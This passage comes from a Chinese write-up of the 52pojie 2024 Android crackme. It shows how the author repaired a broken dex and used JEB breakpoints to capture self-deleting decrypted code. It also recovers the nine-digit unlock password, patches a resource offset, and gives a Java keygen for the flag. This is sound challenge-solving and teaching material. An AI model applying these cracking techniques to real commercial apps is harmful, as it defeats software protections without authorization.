src="https://https://wechat2rss.xlab.app/img-proxy/?k=aead342a&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKUoOXe430y1umbMQ0HysxuBias4YianNdrWVdyLFgCzxaQ82VicISC8PIA%2F640%3Fwx_fmt%3Djpeg%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>将修复完的dex命名为<code style="font-family: SFMono-Regular, Consolas, ;">classes.dex</code>，置入assets文件夹，重新打包、签名<br />打开jeb调试，发现依然无法正常运行</p><h4>修复2</h4><p>单步调试，定位到错误发生点，发现是程序在</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">try</span> {<br />    <span style="color: rgb(255, 255, 182);">File</span> <span style="color: rgb(198, 197, 254);">file0</span> = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">File</span>(context0.getDir(<span style="color: rgb(168, 255, 96);">"data"</span>, <span style="color: rgb(255, 115, 253);">0</span>), <span style="color: rgb(168, 255, 96);">"decode.dex"</span>);<br />    <span style="color: rgb(150, 203, 254);">if</span>(!file0.exists()) {<br />        <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(198, 197, 254);">null</span>;<br />    }<br />}</code></pre><p>处返回了null，即这个file0，也就是<code style="font-family: SFMono-Regular, Consolas, ;">decode.dex</code>不存在<br />然后程序跳转到了</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">catch</span>(Exception exception0) {<br />    Log.e(<span style="color: rgb(168, 255, 96);">"ZJ595"</span>, <span style="color: rgb(168, 255, 96);">"咦，似乎是坏掉的dex呢！"</span>);<br />    exception0.printStackTrace();<br />    <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(168, 255, 96);">""</span>;<br />}</code></pre><p>打开<code style="font-family: SFMono-Regular, Consolas, ;">adb logcat</code>工具可见返回的错误信息：</p><blockquote><p style="margin-bottom: 15px;">E ZJ595 咦，似乎是坏掉的dex呢！</p></blockquote><p>可见确实是文件不存在的原因导致程序运行异常</p><p>不存在我们就手动新建一个，为了方便起见我就直接复制了一份1.dex，将其改名为decode.dex，使用RE文件管理器放置于与1.dex同目录下（即<code style="font-family: SFMono-Regular, Consolas, ;">data/user/0/com.zj.wuaipojie2024_2/app_data</code>），这样这部分代码就能正常跑起来了</p><p>根据"静态分析"部分代码分析，由于<code style="font-family: SFMono-Regular, Consolas, ;">2.dex</code>文件在写入、加载后即会进行自我删除，于是需要在删除代码位置下断点以保存该中间文件进行分析，断点位置如下：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">.method</span><span style="color: rgb(150, 203, 254);"> private</span><span style="color: rgb(150, 203, 254);"> static</span> varargs getStaticMethod(Context, [I, String, String, [Class)Method<br />          .registers 11<br />          .annotation<span style="color: rgb(150, 203, 254);"> system</span> Signature<br />              value = {<br />                  <span style="color: rgb(168, 255, 96);">"("</span>,<br />                  <span style="color: rgb(168, 255, 96);">"Landroid/content/Context;"</span>,<br />                  <span style="color: rgb(168, 255, 96);">"[I"</span>,<br />                  <span style="color: rgb(168, 255, 96);">"Ljava/lang/String;"</span>,<br />                  <span style="color: rgb(168, 255, 96);">"Ljava/lang/String;"</span>,<br />                  <span style="color: rgb(168, 255, 96);">"["</span>,<br />                  <span style="color: rgb(168, 255, 96);">"Ljava/lang/Class&lt;"</span>,<br />                  <span style="color: rgb(168, 255, 96);">"*&gt;;)"</span>,<br />                  <span style="color: rgb(168, 255, 96);">"Ljava/lang/reflect/Method;"</span><br />              }<span style="color: rgb(150, 203, 254);"><br />          .end annotation</span><br />          .annotation<span style="color: rgb(150, 203, 254);"> system</span> Throws<br />              value = {<br />                  Exception<br />              }<span style="color: rgb(150, 203, 254);"><br />          .end annotation</span><br />00000000  const/4             v0, 0<span style="color: rgb(150, 203, 254);"><br />:try_2</span><br />00000002  invoke-static       C-&gt;read(Context)ByteBuffer, p0<br />00000008  move-result-object  v1<br />0000000A  const/4             v2, 0<br />0000000C  aget                v3, p1, v2<br />00000010  const/4             v4, 1<br />00000012  aget                v4, p1, v4<br />00000016  const/4             v5, 2<br />00000018  aget                p1, p1, v5<br />0000001C  invoke-static       C-&gt;fix(ByteBuffer, I, I, I, Context)File, v1, v3, v4, p1, p0<br />00000022  move-result-object  p1<br />00000024  invoke-virtual      Object-&gt;getClass()Class, p0<br />0000002A  move-result-object  v1<br />0000002C  invoke-virtual      Class-&gt;getClassLoader()ClassLoader, v1<br />00000032  move-result-object  v1<br />00000034  const-string        v3, <span style="color: rgb(168, 255, 96);">"fixed"</span><br />00000038  invoke-virtual      Context-&gt;getDir(String, I)File, p0, v3, v2<br />0000003E  move-result-object  p0<br />00000040  new-instance        v2, DexClassLoader<br />00000044  invoke-virtual      File-&gt;getAbsolutePath()String, p1<br />0000004A  move-result-object  v3<br />0000004C  invoke-virtual      File-&gt;getAbsolutePath()String, p0<br />00000052  move-result-object  v4<br />00000054  invoke-direct       DexClassLoader-&gt;&lt;init&gt;(String, String, String, ClassLoader)V, v2, v3, v4, v0, v1<br />0000005A  invoke-virtual      DexClassLoader-&gt;loadClass(String)Class, v2, p2<br />00000060  move-result-object  p2<br />00000062  invoke-virtual      Class-&gt;getDeclaredMethod(String, [Class)Method, p2, p3, p4<br />00000068  move-result-object  p2<br />0000006A  invoke-virtual      File-&gt;delete()Z, p1  <span style="color: rgb(124, 124, 124);">#在此处下断点，防止文件删除</span><br />00000070  new-instance        p3, File<br />00000074  invoke-virtual      File-&gt;getName()String, p1<br />0000007A  move-result-object  p1<br />0000007C  invoke-direct       File-&gt;&lt;init&gt;(File, String)V, p3, p0, p1<br />00000082  invoke-virtual      File-&gt;delete()Z, p3<br />          .catch Exception {:try_2 ..<span style="color: rgb(150, 203, 254);"> :tryend_88</span>}<span style="color: rgb(150, 203, 254);"> :catch_8A</span><span style="color: rgb(150, 203, 254);"><br />:tryend_88</span><br />00000088  return-object       p2<span style="color: rgb(150, 203, 254);"><br />:catch_8A</span>  <span style="color: rgb(124, 124, 124);"># used for: Ljava/lang/Exception;</span><br />0000008A  move-exception      p0<br />0000008C  invoke-virtual      Exception-&gt;printStackTrace()V, p0<br />00000092  return-object       v0<span style="color: rgb(150, 203, 254);"><br />.end method</span></code></pre><p>然后在<code style="font-family: SFMono-Regular, Consolas, ;">data/user/0/com.zj.wuaipojie2024_2/app_data</code>下即可找到修复后的<code style="font-family: SFMono-Regular, Consolas, ;">2.dex</code>文件</p><p>修复后的<code style="font-family: SFMono-Regular, Consolas, ;">2.dex</code>中的A类如下：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">package</span> com.zj.wuaipojie2024_2;<br /><br /><span style="color: rgb(150, 203, 254);">import</span> android.content.Context;<br /><br /><span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">class</span> <span style="color: rgb(255, 255, 182);">A</span> {<br />    <span style="color: rgb(150, 203, 254);">private</span> <span style="color: rgb(150, 203, 254);">static</span> <span style="color: rgb(150, 203, 254);">final</span> <span style="color: rgb(255, 255, 182);">String</span> <span style="color: rgb(198, 197, 254);">SUCCESS_TAG</span> = <span style="color: rgb(168, 255, 96);">"唉!"</span>;<br /><br />    <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">static</span> <span style="color: rgb(255, 255, 182);">boolean</span> <span style="color: rgb(255, 255, 182);">b</span>() {<br />        <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(198, 197, 254);">false</span>;<br />    }<br /><br />    <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">static</span> String <span style="color: rgb(255, 255, 182);">c</span>(String s) {<br />        <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(168, 255, 96);">"?"</span> + s + <span style="color: rgb(168, 255, 96);">"?"</span>;<br />    }<br /><br />    <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">static</span> String <span style="color: rgb(255, 255, 182);">d</span>(Context context0, String s) {<br />        MainActivity.sSS(s);<br />        <span style="color: rgb(255, 255, 182);">String</span> <span style="color: rgb(198, 197, 254);">s1</span> = Utils.getSignInfo(context0);<br />        <span style="color: rgb(150, 203, 254);">if</span>(s1 != <span style="color: rgb(198, 197, 254);">null</span> &amp;&amp; (s1.equals(<span style="color: rgb(168, 255, 96);">"fe4f4cec5de8e8cf2fca60a4e61f67bcd3036117"</span>))) {<br />            <span style="color: rgb(255, 255, 182);">StringBuffer</span> <span style="color: rgb(198, 197, 254);">stringBuffer0</span> = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">StringBuffer</span>();<br />            <span style="color: rgb(150, 203, 254);">for</span>(<span style="color: rgb(255, 255, 182);">int</span> <span style="color: rgb(198, 197, 254);">v</span> = <span style="color: rgb(255, 115, 253);">0</span>; stringBuffer0.length() &lt; <span style="color: rgb(255, 115, 253);">9</span> &amp;&amp; v &lt; <span style="color: rgb(255, 115, 253);">40</span>; ++v) {<br />                <span style="color: rgb(255, 255, 182);">String</span> <span style="color: rgb(198, 197, 254);">s2</span> = <span style="color: rgb(168, 255, 96);">"0485312670fb07047ebd2f19b91e1c5f"</span>.substring(v, v + <span style="color: rgb(255, 115, 253);">1</span>);<br />                <span style="color: rgb(150, 203, 254);">if</span>(!stringBuffer0.toString().contains(s2)) {<br />                    stringBuffer0.append(s2);<br />                }<br />            }<br /><br />            <span style="color: rgb(150, 203, 254);">return</span> s.equals(stringBuffer0.toString().toUpperCase()) ? <span style="color: rgb(168, 255, 96);">"唉!哪有什么亿载沉睡的玄天帝，不过是一位被诅咒束缚的旧日之尊，在灯枯之际挣扎的南柯一梦罢了。有缘人，这份机缘就赠予你了。坐标在B.d"</span> : <span style="color: rgb(168, 255, 96);">""</span>;<br />        }<br /><br />        <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(168, 255, 96);">""</span>;<br />    }<br />}</code></pre><p>此处的A.d函数给出了密码<code style="font-family: SFMono-Regular, Consolas, ;">s</code>的真值以及一个提示</p><p>写个小程序获取解锁密码<code style="font-family: SFMono-Regular, Consolas, ;">s</code>：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">import</span> java.io.*;<br /><span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">class</span> <span style="color: rgb(255, 255, 182);">GetPass</span> {<br />    <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">static</span> <span style="color: rgb(150, 203, 254);">void</span> <span style="color: rgb(255, 255, 182);">main</span>(String[] args) {<br />        <span style="color: rgb(255, 255, 182);">StringBuffer</span> <span style="color: rgb(198, 197, 254);">stringBuffer0</span> = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">StringBuffer</span>();<br />        <span style="color: rgb(150, 203, 254);">for</span>(<span style="color: rgb(255, 255, 182);">int</span> <span style="color: rgb(198, 197, 254);">v</span> = <span style="color: rgb(255, 115, 253);">0</span>; stringBuffer0.length() &lt; <span style="color: rgb(255, 115, 253);">9</span> &amp;&amp; v &lt; <span style="color: rgb(255, 115, 253);">40</span>; ++v) {<br />            <span style="color: rgb(255, 255, 182);">String</span> <span style="color: rgb(198, 197, 254);">s2</span> = <span style="color: rgb(168, 255, 96);">"0485312670fb07047ebd2f19b91e1c5f"</span>.substring(v, v + <span style="color: rgb(255, 115, 253);">1</span>);<br />            <span style="color: rgb(150, 203, 254);">if</span>(!stringBuffer0.toString().contains(s2)) {<br />                stringBuffer0.append(s2);<br />            }<br />        }<br />        System.out.println(stringBuffer0.toString().toUpperCase());<br />    }<br />}</code></pre><p>输出为：</p><blockquote><p style="margin-bottom: 15px;">048531267 （九宫格密码的真值，后续会用到）<br /><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=cfdc5858&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOK9JoolO4XtMbkEBZJEBuqw6Fkk2CNibjDb18kKHaqiaJo8RKV3aKfhwBQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p></blockquote><p>下面来看看提示：</p><blockquote><p style="margin-bottom: 15px;">"唉!哪有什么亿载沉睡的玄天帝，不过是一位被诅咒束缚的旧日之尊，在灯枯之际挣扎的南柯一梦罢了。有缘人，这份机缘就赠予你了。坐标在B.d"</p></blockquote><p>找到B类......<br />（怎么还是讨厌的"?"+s+"?"）</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">class</span> <span style="color: rgb(255, 255, 182);">B</span> {<br />    <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">static</span> String <span style="color: rgb(255, 255, 182);">d</span>(String s) {<br />        <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(168, 255, 96);">"?"</span> + s + <span style="color: rgb(168, 255, 96);">"?"</span>;<br />    }<br />}</code></pre><p>看来这个B.d还是坏的，还得修复一次</p><h4>修复3</h4><p>原先程序里的那个fix函数只能修复A.d部分，接下来修复B.d</p><p>回到MainActivity，还是定位到这句</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(255, 255, 182);">String</span> <span style="color: rgb(198, 197, 254);">s1</span> = (String)<span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">DexClassLoader</span>(file0.getAbsolutePath(), file1.getAbsolutePath(), <span style="color: rgb(198, 197, 254);">null</span>, classLoader0).loadClass(<span style="color: rgb(168, 255, 96);">"com.zj.wuaipojie2024_2.C"</span>).getDeclaredMethod(<span style="color: rgb(168, 255, 96);">"isValidate"</span>, Context.class, String.class, <span style="color: rgb(255, 255, 182);">int</span>[].class).invoke(<span style="color: rgb(198, 197, 254);">null</span>, this, s, this.getResources().getIntArray(array.A_offset));</code></pre><p>语句中出现了A_offset，说明是修复A类型的，定位到array.A_offset这个变量</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">static</span> <span style="color: rgb(150, 203, 254);">final</span> <span style="color: rgb(150, 203, 254);">class</span> <span style="color: rgb(255, 255, 182);">array</span> {<br />        <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">static</span> <span style="color: rgb(255, 255, 182);">int</span> <span style="color: rgb(198, 197, 254);">A_offset</span> = <span style="color: rgb(255, 115, 253);">0x7F030000</span>;  <span style="color: rgb(124, 124, 124);">// array:A_offset</span><br />        <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">static</span> <span style="color: rgb(255, 255, 182);">int</span> <span style="color: rgb(198, 197, 254);">B_offset</span> = <span style="color: rgb(255, 115, 253);">0x7F030001</span>;  <span style="color: rgb(124, 124, 124);">// array:B_offset</span><br /><br />    }</code></pre><p>（诶，A_offset下面那个B_offset是啥？这不是我们要找的“B类”的偏移嘛，这下不用手算了）</p><p>直接jeb跑起来，在A_offeset处下断点，把A_offset的值换成B_offset</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">000000E4  sget                v3, R$array-&gt;A_offset:I  <span style="color: rgb(124, 124, 124);">#此处下断点，修改Locals中v3的值为B_offset，即将其改为7F30001h，如图</span><br />000000E8  invoke-virtual      Resources-&gt;getIntArray(I)[I, p1, v3</code></pre><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=a1cda62e&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKOuKDGoYwJKETq2ecpZc85neAibPd4PXCic4ZshiaXmT4Gn4bWRLMqBwHg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>运行程序，断点至本文"修复2"部分提及的删除函数，得到B.d修复后的<code style="font-family: SFMono-Regular, Consolas, ;">2_new.dex</code>（此处为了避免与上部分中2.dex混淆，将其命名为2_new.dex，实际由程序生成的文件名仍为2.dex）</p><p>打开2_new.dex，反编译得到其中的B类，定位至B.d</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">class</span> <span style="color: rgb(255, 255, 182);">B</span> {<br />    <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">static</span> String <span style="color: rgb(255, 255, 182);">d</span>(String s) {<br />        <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(168, 255, 96);">"机缘是{"</span> + Utils.md5(Utils.getSha1(<span style="color: rgb(168, 255, 96);">"password+你的uid"</span>.getBytes())) + <span style="color: rgb(168, 255, 96);">"}"</span>;<br />    }<br />}</code></pre><blockquote><p style="margin-bottom: 15px;"><span style="font-weight: 700;">Flag："{" + Utils.md5(Utils.getSha1("password+你的uid".getBytes())) + "}"</span><br />其中的password上面已经提到了，是"048531267"</p></blockquote><p>到此，这个CM终于完事了</p><p><span style="font-weight: 700;">此处特别感谢 正己 佬提供的题目以及指点</span></p><h3>附——Utils中的两个算法（由smali代码反编译得到，无法直接运行）：</h3><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">    <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">static</span> <span style="color: rgb(255, 255, 182);">byte</span>[] getSha1(<span style="color: rgb(255, 255, 182);">byte</span>[] arr_b) {<br />        <span style="color: rgb(150, 203, 254);">try</span> {<br />            <span style="color: rgb(150, 203, 254);">return</span> MessageDigest.getInstance(<span style="color: rgb(168, 255, 96);">"SHA"</span>).digest(arr_b);<br />        }<br />        <span style="color: rgb(150, 203, 254);">catch</span>(Exception unused_ex) {<br />            <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(198, 197, 254);">null</span>;<br />        }<br />    }<br />    <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">static</span> String <span style="color: rgb(255, 255, 182);">md5</span>(<span style="color: rgb(255, 255, 182);">byte</span>[] arr_b) {<br />        <span style="color: rgb(255, 255, 182);">int</span> v;<br />        <span style="color: rgb(150, 203, 254);">try</span> {<br />            <span style="color: rgb(255, 255, 182);">String</span> <span style="color: rgb(198, 197, 254);">s</span> = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">BigInteger</span>(<span style="color: rgb(255, 115, 253);">1</span>, MessageDigest.getInstance(<span style="color: rgb(168, 255, 96);">"md5"</span>).digest(arr_b)).toString(<span style="color: rgb(255, 115, 253);">16</span>);<br />            v = <span style="color: rgb(255, 115, 253);">0</span>;<br />            <span style="color: rgb(150, 203, 254);">while</span>(<span style="color: rgb(198, 197, 254);">true</span>) {<br />            label_2:<br />                <span style="color: rgb(150, 203, 254);">if</span>(v &gt;= <span style="color: rgb(255, 115, 253);">0x20</span> - s.length()) {<br />                    <span style="color: rgb(150, 203, 254);">return</span> s;<br />                }<br /><br />                s = <span style="color: rgb(168, 255, 96);">"0"</span> + s;<br />                <span style="color: rgb(150, 203, 254);">break</span>;<br />            }<br />        }<br />        <span style="color: rgb(150, 203, 254);">catch</span>(NoSuchAlgorithmException unused_ex) {<br />            <span style="color: rgb(150, 203, 254);">throw</span> <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">RuntimeException</span>(<span style="color: rgb(168, 255, 96);">"ops!!"</span>);<br />        }<br /><br />        ++v;<br />        goto label_2;<br />    }</code></pre><h3>写个小程序计算一下flag（注册机）</h3><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">import</span> java.io.*;<br /><span style="color: rgb(150, 203, 254);">import</span> java.math.BigInteger;<br /><span style="color: rgb(150, 203, 254);">import</span> java.security.MessageDigest;<br /><span style="color: rgb(150, 203, 254);">import</span> java.security.NoSuchAlgorithmException;<br /><span style="color: rgb(150, 203, 254);">import</span> java.util.Scanner;<br /><br /><span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">class</span> <span style="color: rgb(255, 255, 182);">GetFlag</span> {<br />    <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">static</span> <span style="color: rgb(255, 255, 182);">byte</span>[] getSha1(<span style="color: rgb(255, 255, 182);">byte</span>[] arr_b) {<br />        <span style="color: rgb(150, 203, 254);">try</span> {<br />            <span style="color: rgb(150, 203, 254);">return</span> MessageDigest.getInstance(<span style="color: rgb(168, 255, 96);">"SHA"</span>).digest(arr_b);<br />        }<br />        <span style="color: rgb(150, 203, 254);">catch</span>(Exception unused_ex) {<br />            <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(198, 197, 254);">null</span>;<br />        }<br />    }<br />    <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">static</span> String <span style="color: rgb(255, 255, 182);">md5</span>(<span style="color: rgb(255, 255, 182);">byte</span>[] arr_b) {<br />        <span style="color: rgb(150, 203, 254);">try</span> {<br />            <span style="color: rgb(255, 255, 182);">String</span> <span style="color: rgb(198, 197, 254);">s</span> = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">BigInteger</span>(<span style="color: rgb(255, 115, 253);">1</span>, MessageDigest.getInstance(<span style="color: rgb(168, 255, 96);">"md5"</span>).digest(arr_b)).toString(<span style="color: rgb(255, 115, 253);">16</span>);<br />            <span style="color: rgb(150, 203, 254);">return</span> s;<br />        }<br />        <span style="color: rgb(150, 203, 254);">catch</span>(NoSuchAlgorithmException unused_ex) {<br />            <span style="color: rgb(150, 203, 254);">throw</span> <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">RuntimeException</span>(<span style="color: rgb(168, 255, 96);">"ops!!"</span>);<br />        }<br />    }<br />    <span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">static</span> <span style="color: rgb(150, 203, 254);">void</span> <span style="color: rgb(255, 255, 182);">main</span>(String args[]) {<br />        <span style="color: rgb(150, 203, 254);">try</span> (<span style="color: rgb(255, 255, 182);">Scanner</span> <span style="color: rgb(198, 197, 254);">scanner</span> = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">Scanner</span>(System.in)) {<br />            System.out.println(<span style="color: rgb(168, 255, 96);">"Please Input Your UID："</span>);<br />            <span style="color: rgb(255, 255, 182);">String</span> <span style="color: rgb(198, 197, 254);">s</span> = <span style="color: rgb(168, 255, 96);">"048531267"</span> + scanner.next();<br />            System.out.println(<span style="color: rgb(168, 255, 96);">"Flag："</span> + <span style="color: rgb(168, 255, 96);">"{"</span> + GetFlag.md5(GetFlag.getSha1(s.getBytes())) + <span style="color: rgb(168, 255, 96);">"}"</span> );<br />        }<br />    }<br />}</code></pre><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=5ee3d817&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKvRc80Hib8jlf6nVQEptHxOg9OONPXc9Fe0h93GiaArqlibSvMKA8avJdQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><h2>总结</h2><p>正如开头所说，这是我第一次参与红包活动，也是第一次接触安卓类的逆向<br />因文章篇幅所限，一些细节的内容（比如环境配置、设置apk为可调试等）不能详尽地涉及，如果有对以上部分有疑问和建议也欢迎各位在楼下交流讨论</p><p><span>总体而言这几道题目相对来说难度还行（主要还是我太菜了）</span></p><h3>前言</h3><p>好家伙，这下Web题越来越像猜灯谜了，而且还是眼睛有点酸的那种......<br />（说的就是flag1和3，愿称之为opencv独家赞助伙伴【bushi】）</p><h3>题目简介</h3><p>活动地址：https://www.52pojie.cn/thread-1889163-1-1.html<br />解题线索视频：https://www.bilibili.com/video/BV1ap421R7VS<br />题目共包含 12 个静态 flag: flag1~flag12，另外还需要寻找到 3 个动态 flag: 